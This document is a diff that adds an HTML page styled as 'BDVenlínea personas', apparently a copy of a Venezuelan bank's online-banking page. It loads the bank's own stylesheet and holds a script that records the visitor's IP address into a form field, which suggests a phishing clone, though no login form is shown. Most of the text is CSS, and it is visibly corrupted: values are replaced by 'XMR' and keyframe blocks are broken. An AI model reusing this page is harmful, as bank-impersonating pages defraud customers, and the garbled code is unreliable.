@@ -1,0 +1,3041 @@
+<html lang="es">
+    <head>
+    <meta charset="utf-8">
+    <title>BDVenlínea personas</title>
+    <base href="/">
+    
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    
+    <meta http-equiv="pragma" content="no-cache">
+    <meta name="google" content="notranslate">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+     
+    
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    
+    
+    
+    
+    
+    
+    
+    
+    <script type="application/javascript">
+        function getIP(json) {
+            document.getElementById("ipaddress").value = json.ip;
+        }
+        
+        </script>
+    
+    
+    
+    
+    
+    
+    
+    
+    <meta name="theme-color" content="#ffffff">
+
+ 
+    <link rel="stylesheet" href="https://bdvenlinea.banvenez.com/styles.0170017f8b642b1668e6.css">
+    <style>
+        h3[_ngcontent-c0],
+        th[_ngcontent-c0] {
+            color: #0067b1
+        }
+
+        @media print {
+            .noprint-section[_ngcontent-c0] {
+                display: none !important
+            }
+        }
+    </style>
+    <style>
+        .logo[_ngcontent-c13] {
+    height: 40%;
+    width: 10em;
+    margin-left: 0.7em;
+    margin-top: 0.4em;
+}
+        #spinner[_ngcontent-c1] {
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            position: fixed;
+            z-index: 9999;
+            opacity: .7;
+            background-color: #f1f1f1;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        .colored-parent,
+        .colored>div {
+            background-color: #333
+        }
+    </style> 
+    <style>
+        .sk-wave[_ngcontent-c9] {
+            position: relative;
+            top: 50%;
+            margin: auto;
+            width: 50px;
+            height: 40px;
+            text-align: center;
+            font-size: 10px
+        }
+
+        .sk-wave[_ngcontent-c9] .sk-rect[_ngcontent-c9] {
+            float: left;
+            margin-right: 1px;
+            height: 100%;
+            width: 6px;
+            display: inline-block;
+            -webkit-animation: 1.2s ease-in-out infinite sk-waveStretchDelay;
+            animation: 1.2s ease-in-out infinite sk-waveStretchDelay
+        }
+
+        .sk-wave[_ngcontent-c9] .sk-rect1[_ngcontent-c9] {
+            -webkit-animation-delay: -1.2s;
+            animation-delay: -1.2s
+        }
+
+        .sk-wave[_ngcontent-c9] .sk-rect2[_ngcontent-c9] {
+            -webkit-animation-delay: -1.1s;
+            animation-delay: -1.1s
+        }
+
+        .sk-wave[_ngcontent-c9] .sk-rect3[_ngcontent-c9] {
+            -webkit-animation-delay: -1s;
+            animation-delay: -1s
+        }
+
+        .sk-wave[_ngcontent-c9] .sk-rect5[_ngcontent-c9] {
+            -webkit-animation-delay: -.8s;
+            animation-delay: -.8s
+        }
+
+        .sk-wave[_ngcontent-c9] .sk-rect4[_ngcontent-c9] {
+            -webkit-animation-delay: -.9s;
+            animation-delay: -.9s
+        }
+
+        @-webkit-keyframes sk-waveStretchDelay {
+            0%,
+            100%,
+            XMR: scaleY(1)
+        }
+        }
+
+        @keyframes sk-waveStretchDelay {
+            0%,
+            100%,
+            XMR: scaleY(1)
+        }
+        }
+    </style> 
+    <style>
+        .snackBar {
+            background-color: #0067b1;
+            width: 100% !important;
+            max-width: 100% !important
+        }
+
+        .snackBar button {
+            color: #fff;
+            font-weight: 700;
+            font-size: small;
+            border-radius: 5px;
+            background-color: #2e73c7
+        }
+
+        .remove-padding[_ngcontent-c10] {
+            padding: 0 !important
+        }
+
+        .mark[_ngcontent-c10] {
+            background-color: transparent;
+            color: #fff;
+            font-weight: 700;
+            font-family: Nunito
+        }
+
+        .div_mark[_ngcontent-c10] {
+            margin-top: .9em
+        }
+
+        .marquee[_ngcontent-c10] {
+            padding: 0 !important
+        }
+
+        .marquee[_ngcontent-c10] .ng-marquee {
+            background-image: url(/assets/banner/BannerPrincipal.png);
+            background-repeat: round;
+            background-size: cover;
+            height: 50px;
+            width: 100%;
+            max-width: 100%;
+            padding: 0 !important;
+            margin: 0 !important
+        }
+
+        .ng-marquee {
+            -webkit-animation-play-state: paused;
+            animation-play-state: paused;
+            -webkit-animation-delay: 2s;
+            animation-delay: 2s
+        }
+
+        .row.margin_zero[_ngcontent-c10] {
+            margin: 0 !important;
+            padding: 0 !important;
+            border: 0
+        }
+
+        .mat-icon[_ngcontent-c10] {
+            font-size: XMR
+        }
+
+        .mat-sidenav-container[_ngcontent-c11] {
+            background-color: #ededed !important;
+            height: 100vh
+        }
+
+        .sidenav-toolbar[_ngcontent-c11] {
+            height: 64px;
+            display: flex;
+            flex-direction: row
+        }
+
+        @media (max-width:600px) {
+            .sidenav-toolbar[_ngcontent-c11] {
+                height: 56px
+            }
+        }
+
+        .mat-nav-list[_ngcontent-c11] {
+            padding-top: 0
+        }
+
+        .menu-list-item.mat-list-item[_ngcontent-c11] .mat-list-item-content[_ngcontent-c11] {
+            flex: 1 1 100%
+        }
+
+        .version-info[_ngcontent-c11] {
+            font-size: 8pt;
+            padding: 8px;
+            align-self: flex-end
+        }
+
+        .business-change[_ngcontent-c11] {
+            float: right;
+            margin-right: 20px
+        }
+
+        mat-form-field[_ngcontent-c11] {
+            padding: 0 !important;
+            font-size: 12px
+        }
+
+        @media (max-width:880px) {
+            .mat-sidenav-content[_ngcontent-c11] {
+                display: flex;
+                flex-direction: column
+            }
+
+            .mat-drawer-container[_ngcontent-c11] {
+                color: rgba(0, 0, 0, .87)
+            }
+
+            .business-change[_ngcontent-c11] {
+                margin-top: -40px
+            }
+        }
+
+        .mark[_ngcontent-c11] {
+            background-color: transparent;
+            font-family: Nunito
+        }
+
+        .div_mark[_ngcontent-c11] {
+            margin-top: 1.25em;
+            z-index: 10 !important
+        }
+
+        .ban1 {
+            color: #fff;
+            text-decoration: none;
+            font-size: larger
+        }
+
+        .ban2 {
+            color: #eadb00;
+            text-decoration: none;
+            font-size: larger
+        }
+
+        .ban3 {
+            color: #7a0000;
+            text-decoration: none;
+            font-size: larger
+        }
+
+        .button-container[_ngcontent-c11] {
+            margin-top: auto;
+            margin-left: .6em;
+            margin-right: .6em
+        }
+
+        .img-rounded[_ngcontent-c11] {
+            border-radius: 50%
+        }
+
+        .row.margin_zero[_ngcontent-c11] {
+            margin: 0 !important;
+            padding: 0 !important;
+            border: 0
+        }
+
+        .mat-icon[_ngcontent-c11] {
+            font-size: XMR !important
+        }
+
+        .exp[_ngcontent-c11] .mat-expansion-panel-body {
+            padding: 0
+        }
+
+        .expansion[_ngcontent-c11] {
+            height: auto !important;
+            padding: 0;
+            background-color: #1c2a3c !important
+        }
+
+        .expansion[_ngcontent-c11] .mat-expansion-indicator {
+            vertical-align: top !important;
+            margin-right: 50%
+        }
+
+        .expansion[_ngcontent-c11] .mat-expansion-indicator::after {
+            color: #fff !important;
+            margin-right: 50%
+        }
+
+        .separador[_ngcontent-c11] {
+            width: 100%;
+            height: 50px
+        }
+
+        .marquee[_ngcontent-c11] {
+            padding: 0 !important;
+            width: 100% !important;
+            background-image: url(/assets/banner/BannerPrincipal.png);
+            background-repeat: round;
+            background-size: cover;
+            height: 50px;
+            margin: 0 !important
+        }
+
+        .marquee[_ngcontent-c11] div[_ngcontent-c11] {
+            position: absolute;
+            white-space: nowrap;
+            margin: 0;
+            line-height: 50px;
+            text-align: center;
+            -webkit-transform: translateX(-50%);
+            transform: translateX(-50%);
+            -webkit-animation: linear infinite scroll-left;
+            animation: linear infinite scroll-left
+        }
+
+        .marquee[_ngcontent-c11]:hover div[_ngcontent-c11] {
+            -webkit-animation-play-state: paused !important;
+            animation-play-state: paused !important
+        }
+
+        @-webkit-keyframes scroll-left {
+            0% {
+                -webkit-transform: translateX(0);
+                left: 100%
+            }
+
+            100% {
+                -webkit-transform: translateX(-100%);
+                left: 0
+            }
+        }
+
+        @keyframes scroll-left {
+            0% {
+                -webkit-transform: translateX(0);
+                transform: translateX(0);
+                left: 100%
+            }
+
+            100% {
+                -webkit-transform: translateX(-100%);
+                transform: translateX(-100%);
+                left: 0
+            }
+        }
+    </style>
+    <style>
+        .mat-drawer-container {
+            position: relative;
+            z-index: 1;
+            box-sizing: border-box;
+            -webkit-overflow-scrolling: touch;
+            display: block;
+            overflow: hidden
+        }
+
+        .mat-drawer-container[fullscreen] {
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            position: absolute
+        }
+
+        .mat-drawer-container[fullscreen].mat-drawer-opened {
+            overflow: hidden
+        }
+
+        .mat-drawer-container.mat-drawer-container-explicit-backdrop .mat-drawer-side {
+            z-index: 3
+        }
+
+        .mat-drawer-backdrop {
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            position: absolute;
+            display: block;
+            z-index: 3;
+            visibility: hidden
+        }
+
+        .mat-drawer-backdrop.mat-drawer-shown {
+            visibility: visible
+        }
+
+        .mat-drawer-transition .mat-drawer-backdrop {
+            transition-duration: .4s;
+            transition-timing-function: cubic-bezier(.25, .8, .25, 1);
+            transition-property: background-color, visibility
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+            .mat-drawer-backdrop {
+                opacity: .5
+            }
+        }
+
+        .mat-drawer-content {
+            position: relative;
+            z-index: 1;
+            display: block;
+            height: 100%;
+            overflow: auto
+        }
+
+        .mat-drawer-transition .mat-drawer-content {
+            transition-duration: .4s;
+            transition-timing-function: cubic-bezier(.25, .8, .25, 1);
+            transition-property: transform, margin-left, margin-right
+        }
+
+        .mat-drawer {
+            position: relative;
+            z-index: 4;
+            display: block;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            z-index: 3;
+            outline: 0;
+            box-sizing: border-box;
+            overflow-y: auto;
+            transform: translate3d(-100%, 0, 0)
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+
+            .mat-drawer,
+            [dir=rtl] .mat-drawer.mat-drawer-end {
+                border-right: solid 1px currentColor
+            }
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+
+            .mat-drawer.mat-drawer-end,
+            [dir=rtl] .mat-drawer {
+                border-left: solid 1px currentColor;
+                border-right: none
+            }
+        }
+
+        .mat-drawer.mat-drawer-side {
+            z-index: 2
+        }
+
+        .mat-drawer.mat-drawer-end {
+            right: 0;
+            transform: translate3d(100%, 0, 0)
+        }
+
+        [dir=rtl] .mat-drawer {
+            transform: translate3d(100%, 0, 0)
+        }
+
+        [dir=rtl] .mat-drawer.mat-drawer-end {
+            left: 0;
+            right: auto;
+            transform: translate3d(-100%, 0, 0)
+        }
+
+        .mat-drawer:not(.mat-drawer-side) {
+            box-shadow: 0 8px 10px -5px rgba(0, 0, 0, .2), 0 16px 24px 2px rgba(0, 0, 0, .14), 0 6px 30px 5px rgba(0, 0, 0, .12)
+        }
+
+        .mat-sidenav-fixed {
+            position: fixed
+        }
+    </style>
+    <style>
+        .spacer[_ngcontent-c13] {
+            flex: 1 1 auto
+        }
+
+        .logo[_ngcontent-c13] {
+            height: XMR.5px;
+            margin-left: .75em
+        }
+
+        .logo[_ngcontent-c13]:hover {
+            cursor: pointer
+        }
+
+        .responsive-menu-button[_ngcontent-c13] {
+            display: none
+        }
+
+        .button-container-img[_ngcontent-c13] {
+            margin-top: auto;
+            margin-right: .6em;
+            margin-left: .6em
+        }
+
+        @media (max-width:880px) {
+            .responsive-menu-button[_ngcontent-c13] {
+                display: block
+            }
+        }
+
+        .mat-toolbar-row[_ngcontent-c13],
+        .mat-toolbar-single-row[_ngcontent-c13] {
+            display: inline-flex;
+            flex-wrap: wrap;
+            height: 50px !important;
+            background-color: #f32133;
+        }
+
+        mat-elevation-z1[_ngcontent-c13] {
+            display: inline-flex
+        }
+
+        .img-rounded[_ngcontent-c13] {
+            border-radius: 50%;
+            margin: 0 .25em
+        }
+
+        .button-icon[_ngcontent-c13] {
+            margin-bottom: .5em
+        }
+
+        .container1[_ngcontent-c13] {
+            margin: 0 auto 0 0;
+            float: left
+        }
+
+        .container2[_ngcontent-c13] {
+            margin: 0 0 0 auto;
+            right: 0;
+            float: right
+        }
+
+        .img[_ngcontent-c13] {
+            transform: scale(1);
+            -ms-transform: scale(1);
+            -moz-transform: scale(1);
+            -webkit-transform: scale(1);
+            -o-transform: scale(1);
+            -webkit-transition: .5s ease-in-out;
+            -moz-transition: .5s ease-in-out;
+            -ms-transition: all .5s ease-in-out;
+            -o-transition: .5s ease-in-out
+        }
+
+        .img[_ngcontent-c13]:hover {
+            transform: scale(1.2);
+            -ms-transform: scale(1.2);
+            -moz-transform: scale(1.2);
+            -webkit-transform: scale(1.2);
+            -o-transform: scale(1.2)
+        }
+
+        .button_logout_responsive[_ngcontent-c13] {
+            display: none
+        }
+
+        @media (max-width:880px) {
+            .button_logout_responsive[_ngcontent-c13] {
+                display: unset
+            }
+        }
+
+        @media (max-width:400px) {
+            .logo[_ngcontent-c13] {
+                width: 8em
+            }
+
+            .button_logout_responsive[_ngcontent-c13]>button[_ngcontent-c13] {
+                font-size: .5em
+            }
+        }
+
+        @media (max-width:324px) {
+            .logo[_ngcontent-c13] {
+                width: 6.5em
+            }
+
+            .button_logout_responsive[_ngcontent-c13]>button[_ngcontent-c13] {
+                font-size: .5em
+            }
+        }
+
+        @media (max-width:300px) {
+
+            .button_logout_responsive[_ngcontent-c13],
+            .logo[_ngcontent-c13] {
+                display: none
+            }
+        }
+    </style>
+    <style>
+        .mat-expansion-panel {
+            transition: box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
+            box-sizing: content-box;
+            display: block;
+            margin: 0;
+            transition: margin 225ms cubic-bezier(.4, 0, .2, 1)
+        }
+
+        .mat-expansion-panel:not([class*=mat-elevation-z]) {
+            box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
+        }
+
+        @media screen and (-ms-high-contrast:active) {
+            .mat-expansion-panel {
+                outline: solid 1px
+            }
+        }
+
+        .mat-expansion-panel-content {
+            overflow: hidden
+        }
+
+        .mat-expansion-panel-content.mat-expanded {
+            overflow: visible
+        }
+
+        .mat-expansion-panel-body {
+            padding: 0 24px 16px
+        }
+
+        .mat-expansion-panel-spacing {
+            margin: 16px 0
+        }
+
+        .mat-accordion>.mat-expansion-panel-spacing:first-child,
+        .mat-accordion>:first-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing {
+            margin-top: 0
+        }
+
+        .mat-accordion>.mat-expansion-panel-spacing:last-child,
+        .mat-accordion>:last-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing {
+            margin-bottom: 0
+        }
+
+        .mat-action-row {
+            border-top-style: solid;
+            border-top-width: 1px;
+            display: flex;
+            flex-direction: row;
+            justify-content: flex-end;
+            padding: 16px 8px 16px 24px
+        }
+
+        .mat-action-row button.mat-button {
+            margin-left: 8px
+        }
+
+        [dir=rtl] .mat-action-row button.mat-button {
+            margin-left: 0;
+            margin-right: 8px
+        }
+    </style>
+    <style>
+        .mat-expansion-panel-header {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            padding: 0 24px
+        }
+
+        .mat-expansion-panel-header:focus,
+        .mat-expansion-panel-header:hover {
+            outline: 0
+        }
+
+        .mat-expansion-panel-header.mat-expanded:focus,
+        .mat-expansion-panel-header.mat-expanded:hover {
+            background: inherit
+        }
+
+        .mat-expansion-panel-header:not([aria-disabled=true]) {
+            cursor: pointer
+        }
+
+        .mat-content {
+            display: flex;
+            flex: 1;
+            flex-direction: row;
+            overflow: hidden
+        }
+
+        .mat-expansion-panel-header-description,
+        .mat-expansion-panel-header-title {
+            display: flex;
+            flex-grow: 1;
+            margin-right: 16px
+        }
+
+        [dir=rtl] .mat-expansion-panel-header-description,
+        [dir=rtl] .mat-expansion-panel-header-title {
+            margin-right: 0;
+            margin-left: 16px
+        }
+
+        .mat-expansion-panel-header-description {
+            flex-grow: 2
+        }
+
+        .mat-expansion-indicator::after {
+            border-style: solid;
+            border-width: 0 2px 2px 0;
+            content: '';
+            display: inline-block;
+            padding: 3px;
+            transform: rotate(45deg);
+            vertical-align: middle
+        }
+    </style>
+    <style>
+        @media screen and (-ms-high-contrast:active) {
+            .mat-toolbar {
+                outline: solid 1px
+            }
+        }
+
+        .mat-toolbar-row,
+        .mat-toolbar-single-row {
+            display: flex;
+            box-sizing: border-box;
+            padding: 0 16px;
+            width: 100%;
+            flex-direction: row;
+            align-items: center;
+            white-space: nowrap
+        }
+
+        .mat-toolbar-multiple-rows {
+            display: flex;
+            box-sizing: border-box;
+            flex-direction: column;
+            width: 100%
+        }
+
+        .mat-toolbar-multiple-rows {
+            min-height: 64px
+        }
+
+        .mat-toolbar-row,
+        .mat-toolbar-single-row {
+            height: 64px
+        }
+
+        @media (max-width:599px) {
+            .mat-toolbar-multiple-rows {
+                min-height: 56px
+            }
+
+            .mat-toolbar-row,
+            .mat-toolbar-single-row {
+                height: 56px
+            }
+        }
+    </style>
+    <style>
+        .mat-button,
+        .mat-flat-button,
+        .mat-icon-button,
+        .mat-stroked-button {
+            box-sizing: border-box;
+            position: relative;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            -webkit-tap-highlight-color: transparent;
+            display: inline-block;
+            white-space: nowrap;
+            text-decoration: none;
+            vertical-align: baseline;
+            text-align: center;
+            margin: 0;
+            min-width: 88px;
+            line-height: 36px;
+            padding: 0 16px;
+            border-radius: 2px;
+            overflow: visible
+        }
+
+        .mat-button::-moz-focus-inner,
+        .mat-flat-button::-moz-focus-inner,
+        .mat-icon-button::-moz-focus-inner,
+        .mat-stroked-button::-moz-focus-inner {
+            border: 0
+        }
+
+        .mat-button[disabled],
+        .mat-flat-button[disabled],
+        .mat-icon-button[disabled],
+        .mat-stroked-button[disabled] {
+            cursor: default
+        }
+
+        .mat-button.cdk-keyboard-focused .mat-button-focus-overlay,
+        .mat-button.cdk-program-focused .mat-button-focus-overlay,
+        .mat-flat-button.cdk-keyboard-focused .mat-button-focus-overlay,
+        .mat-flat-button.cdk-program-focused .mat-button-focus-overlay,
+        .mat-icon-button.cdk-keyboard-focused .mat-button-focus-overlay,
+        .mat-icon-button.cdk-program-focused .mat-button-focus-overlay,
+        .mat-stroked-button.cdk-keyboard-focused .mat-button-focus-overlay,
+        .mat-stroked-button.cdk-program-focused .mat-button-focus-overlay {
+            opacity: 1
+        }
+
+        .mat-button::-moz-focus-inner,
+        .mat-flat-button::-moz-focus-inner,
+        .mat-icon-button::-moz-focus-inner,
+        .mat-stroked-button::-moz-focus-inner {
+            border: 0
+        }
+
+        .mat-button .mat-button-focus-overlay,
+        .mat-icon-button .mat-button-focus-overlay {
+            opacity: 0
+        }
+
+        .mat-button:hover .mat-button-focus-overlay,
+        .mat-stroked-button:hover .mat-button-focus-overlay {
+            opacity: 1
+        }
+
+        @media (hover:none) {
+
+            .mat-button:hover .mat-button-focus-overlay,
+            .mat-stroked-button:hover .mat-button-focus-overlay {
+                opacity: 0
+            }
+        }
+
+        .mat-raised-button {
+            box-sizing: border-box;
+            position: relative;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            -webkit-tap-highlight-color: transparent;
+            display: inline-block;
+            white-space: nowrap;
+            text-decoration: none;
+            vertical-align: baseline;
+            text-align: center;
+            margin: 0;
+            min-width: 88px;
+            line-height: 36px;
+            padding: 0 16px;
+            border-radius: 2px;
+            overflow: visible;
+            transform: translate3d(0, 0, 0);
+            transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1)
+        }
+
+        .mat-raised-button::-moz-focus-inner {
+            border: 0
+        }
+
+        .mat-raised-button[disabled] {
+            cursor: default
+        }
+
+        .mat-raised-button.cdk-keyboard-focused .mat-button-focus-overlay,
+        .mat-raised-button.cdk-program-focused .mat-button-focus-overlay {
+            opacity: 1
+        }
+
+        .mat-raised-button::-moz-focus-inner {
+            border: 0
+        }
+
+        .mat-raised-button:not([class*=mat-elevation-z]) {
+            box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
+        }
+
+        ._mat-animation-noopable.mat-raised-button {
+            transition: none;
+            animation: none
+        }
+
+        .mat-raised-button:not([disabled]):active:not([class*=mat-elevation-z]) {
+            box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
+        }
+
+        .mat-raised-button[disabled] {
+            box-shadow: none
+        }
+
+        .mat-stroked-button {
+            border: 1px solid currentColor;
+            padding: 0 15px;
+            line-height: 34px
+        }
+
+        .mat-stroked-button:not([class*=mat-elevation-z]) {
+            box-shadow: 0 0 0 0 rgba(0, 0, 0, .2), 0 0 0 0 rgba(0, 0, 0, .14), 0 0 0 0 rgba(0, 0, 0, .12)
+        }
+
+        .mat-flat-button:not([class*=mat-elevation-z]) {
+            box-shadow: 0 0 0 0 rgba(0, 0, 0, .2), 0 0 0 0 rgba(0, 0, 0, .14), 0 0 0 0 rgba(0, 0, 0, .12)
+        }
+
+        .mat-fab {
+            box-sizing: border-box;
+            position: relative;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            -webkit-tap-highlight-color: transparent;
+            display: inline-block;
+            white-space: nowrap;
+            text-decoration: none;
+            vertical-align: baseline;
+            text-align: center;
+            margin: 0;
+            min-width: 88px;
+            line-height: 36px;
+            padding: 0 16px;
+            border-radius: 2px;
+            overflow: visible;
+            transform: translate3d(0, 0, 0);
+            transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
+            min-width: 0;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            padding: 0;
+            flex-shrink: 0
+        }
+
+        .mat-fab::-moz-focus-inner {
+            border: 0
+        }
+
+        .mat-fab[disabled] {
+            cursor: default
+        }
+
+        .mat-fab.cdk-keyboard-focused .mat-button-focus-overlay,
+        .mat-fab.cdk-program-focused .mat-button-focus-overlay {
+            opacity: 1
+        }
+
+        .mat-fab::-moz-focus-inner {
+            border: 0
+        }
+
+        .mat-fab:not([class*=mat-elevation-z]) {
+            box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
+        }
+
+        ._mat-animation-noopable.mat-fab {
+            transition: none;
+            animation: none
+        }
+
+        .mat-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
+            box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
+        }
+
+        .mat-fab[disabled] {
+            box-shadow: none
+        }
+
+        .mat-fab:not([class*=mat-elevation-z]) {
+            box-shadow: 0 3px 5px -1px rgba(0, 0, 0, .2), 0 6px 10px 0 rgba(0, 0, 0, .14), 0 1px 18px 0 rgba(0, 0, 0, .12)
+        }
+
+        .mat-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
+            box-shadow: 0 7px 8px -4px rgba(0, 0, 0, .2), 0 12px 17px 2px rgba(0, 0, 0, .14), 0 5px 22px 4px rgba(0, 0, 0, .12)
+        }
+
+        .mat-fab .mat-button-wrapper {
+            padding: 16px 0;
+            display: inline-block;
+            line-height: 24px
+        }
+
+        .mat-mini-fab {
+            box-sizing: border-box;
+            position: relative;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            outline: 0;
+            border: none;
+            -webkit-tap-highlight-color: transparent;
+            display: inline-block;
+            white-space: nowrap;
+            text-decoration: none;
+            vertical-align: baseline;
+            text-align: center;
+            margin: 0;
+            min-width: 88px;
+            line-height: 36px;
+            padding: 0 16px;
+            border-radius: 2px;
+            overflow: visible;
+            transform: translate3d(0, 0, 0);
+            transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
+            min-width: 0;
+            border-radius: 50%;
+
+            width:XMR[disabled] {
+                cursor: default
+            }
+
+            .mat-mini-fab.cdk-keyboard-focused .mat-button-focus-overlay,
+            .mat-mini-fab.cdk-program-focused .mat-button-focus-overlay {
+                opacity: 1
+            }
+
+            .mat-mini-fab::-moz-focus-inner {
+                border: 0
+            }
+
+            .mat-mini-fab:not([class*=mat-elevation-z]) {
+                box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
+            }
+
+            ._mat-animation-noopable.mat-mini-fab {
+                transition: none;
+                animation: none
+            }
+
+            .mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
+                box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
+            }
+
+            .mat-mini-fab[disabled] {
+                box-shadow: none
+            }
+
+            .mat-mini-fab:not([class*=mat-elevation-z]) {
+                box-shadow: 0 3px 5px -1px rgba(0, 0, 0, .2), 0 6px 10px 0 rgba(0, 0, 0, .14), 0 1px 18px 0 rgba(0, 0, 0, .12)
+            }
+
+            .mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
+                box-shadow: 0 7px 8px -4px rgba(0, 0, 0, .2), 0 12px 17px 2px rgba(0, 0, 0, .14), 0 5px 22px 4px rgba(0, 0, 0, .12)
+            }
+
+            .mat-mini-fab .mat-button-wrapper {
+                padding: 8px 0;
+                display: inline-block;
+                line-height: 24px
+            }
+
+            .mat-icon-button {
+                padding: 0;
+                min-width: 0;
+                width: 40px;
+                height: 40px;
+                flex-shrink: 0;
+                line-height: 40px;
+                border-radius: 50%
+            }
+
+            .mat-icon-button .mat-icon,
+            .mat-icon-button i {
+                line-height: 24px
+            }
+
+            .mat-button-focus-overlay,
+            .mat-button-ripple {
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                position: absolute;
+                pointer-events: none;
+                border-radius: inherit
+            }
+
+            .mat-button-focus-overlay {
+                background-color: rgba(0, 0, 0, .12);
+                border-radius: inherit;
+                opacity: 0;
+                transition: opacity .2s cubic-bezier(.35, 0, .25, 1), background-color .2s cubic-bezier(.35, 0, .25, 1)
+            }
+
+            ._mat-animation-noopable .mat-button-focus-overlay {
+                transition: none
+            }
+
+            @media screen and (-ms-high-contrast:active) {
+                .mat-button-focus-overlay {
+                    background-color: rgba(255, 255, 255, .5)
+                }
+            }
+
+            .mat-button-ripple-round {
+                border-radius: 50%;
+                z-index: 1
+            }
+
+            .mat-button .mat-button-wrapper>*,
+            .mat-fab .mat-button-wrapper>*,
+            .mat-flat-button .mat-button-wrapper>*,
+            .mat-icon-button .mat-button-wrapper>*,
+            .mat-mini-fab .mat-button-wrapper>*,
+            .mat-raised-button .mat-button-wrapper>*,
+            .mat-stroked-button .mat-button-wrapper>* {
+                vertical-align: middle
+            }
+
+            .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button,
+            .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button {
+                display: block;
+                font-size: inherit;
+                width: 2.5em;
+                height: 2.5em
+            }
+
+            @media screen and (-ms-high-contrast:active) {
+
+                .mat-button,
+                .mat-fab,
+                .mat-flat-button,
+                .mat-icon-button,
+                .mat-mini-fab,
+                .mat-raised-button {
+                    outline: solid 1px
+                }
+            }
+    </style>
+    <style>
+        .mat-icon {
+            background-repeat: no-repeat;
+            display: inline-block;
+            fill: currentColor;
+            height: 24px;
+            width: 24px
+        }
+
+        .mat-icon.mat-icon-inline {
+            font-size: inherit;
+            height: inherit;
+            line-height: inherit;
+            width: inherit
+        }
+
+        [dir=rtl] .mat-icon-rtl-mirror {
+            transform: scale(-1, 1)
+        }
+
+        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon,
+        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon {
+            display: block
+        }
+
+        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button .mat-icon,
+        .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button .mat-icon {
+            margin: auto
+        }
+    </style>
+    <style>
+        .centrado[_ngcontent-c23] {
+            font-family: Nunito;
+            text-align: center
+        }
+
+        .justify[_ngcontent-c23] {
+            text-align: justify
+        }
+    </style>
+    <style>
+        .mat-card {
+            transition: box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
+            display: block;
+            position: relative;
+            padding: 24px;
+            border-radius: 2px
+        }
+
+        .mat-card .mat-divider-horizontal {
+            position: absolute;
+            left: 0;
+            width: 100%
+        }
+
+        [dir=rtl] .mat-card .mat-divider-horizontal {
+            left: auto;
+            right: 0
+        }
+
+        .mat-card .mat-divider-horizontal.mat-divider-inset {
+            position: static;
+            margin: 0
+        }
+
+        [dir=rtl] .mat-card .mat-divider-horizontal.mat-divider-inset {
+            margin-right: 0
